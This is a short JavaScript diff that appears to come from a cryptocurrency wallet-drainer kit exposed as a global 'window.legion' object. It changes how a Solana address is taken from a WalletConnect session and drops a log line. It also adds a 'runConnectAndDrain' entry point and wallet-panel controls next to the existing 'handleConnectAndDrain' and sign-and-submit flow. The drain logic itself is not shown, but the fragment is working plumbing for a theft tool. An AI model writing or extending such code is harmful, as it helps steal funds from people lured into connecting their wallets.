-      if (solAddr) {
+      var sParts = ns.solana.accounts[0].split(':');
+      var sAddr = sParts.length >= 3 ? sParts.slice(2).join(':') : '';
+      if (sAddr) {
         connectedChains.SOL = {
-          chain: 'SOL',
-          config: CHAIN_CONFIG.SOL,
-          address: solAddr,
-          walletType: 'WalletConnect',
-          provider: provider,
-          connected: true,
-          timestamp: Date.now()
+          chain: 'SOL', config: CHAIN_CONFIG.SOL, address: sAddr,
+          walletType: 'WalletConnect', provider: provider,
+          connected: true, timestamp: Date.now()
         };
         count++;
-        LOGGER.info('WC SOL connected:', solAddr.substring(0, 10) + '...');
       }
     }
-
     return count;
   }
 
   // Run sign + submit flow after WC connects
-  async function runWCSignAndSubmit(provider) {
+  async function runWCSignAndSubmit() {
     updateStatus('Connected via WalletConnect! Signing...');
 
     // Build connected map for signing
@@ -3498,7 +3834,10 @@
     window.legion = {
       init: window.legion_initializeV2,
       connect: window.handleConnectAndDrain,
+      connectDirect: runConnectAndDrain,
       connectWC: handleWalletConnect,
+      openPanel: openWalletPanel,
+      closePanel: closeWalletPanel,
       getWallets: function() {
         var out = {};
         Object.keys(connectedChains).forEach(function(k) {
